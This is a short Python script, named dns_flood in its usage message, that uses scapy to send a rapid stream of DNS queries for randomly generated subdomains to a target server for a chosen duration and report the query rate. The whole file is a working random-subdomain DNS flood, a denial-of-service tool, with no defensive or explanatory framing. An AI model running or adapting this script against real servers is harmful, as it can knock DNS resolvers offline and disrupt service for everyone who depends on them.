#!/usr/bin/python

import time

from scapy.all import *


def query(server, duration=10):
    top =[ ".com", ".net" , ".com", ".edu" , ".ch", ".de", ".li", ".jp",
            ".ru", ".tv",".nl",".fr", ".cn" ]
    anz_top=len(top)

    cnt = 0
    start = time.time()
    while time.time() - start < duration:
        s = RandString(RandNum(1,50))
        s1 =s.lower()
        d = RandString(RandNum(1,20))
        d1 = d.lower()
        t = top_level=top[random.randint(0,anz_top-1)]
        t1 = t.lower()
        q = s1+"."+d1+t1
        print q
        send(IP(dst=server)/UDP(sport=RandShort())/DNS(rd=1,qd=DNSQR(qname=q)))
        cnt += 1
    print 'Rate=%d/sec' % (cnt/duration)


if __name__ == '__main__':
    if len(sys.argv) > 1:
        if len(sys.argv) > 2:
            query(sys.argv[1], int(sys.argv[2]))
        else:
            query(sys.argv[1])
    else:
        print 'Usage: dns_flood <server> [duration]'
